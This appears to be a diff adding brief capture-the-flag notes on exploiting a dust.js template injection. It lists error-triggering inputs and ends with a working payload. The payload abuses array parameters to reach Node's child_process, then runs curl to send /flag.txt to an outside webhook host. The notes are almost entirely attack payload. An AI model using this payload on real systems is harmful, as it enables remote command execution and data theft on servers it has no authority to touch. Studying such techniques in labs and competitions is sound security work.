@@ -1,0 +1,14 @@
+Cause Error
+
+# Cookie method
+j:[{"id":1,"body":"Hack this"}] =>
+j:[{"id":1,"body":["Hack this'"]}]
+OR
+# Request method
+GET /addNotes?message=abc\
+
+It is running dust.js
+Source: https://artsploit.blogspot.com/2016/08/pprce2.html
+
+Solution:
+GET /addNotes?message[]=x&message[]=y'-require('child_process').exec('curl+https%3a//webhook.site/1259045f-076d-49d7-9435-e1d8058799fd+--data+"flag=$(cat+/flag.txt)"')-'
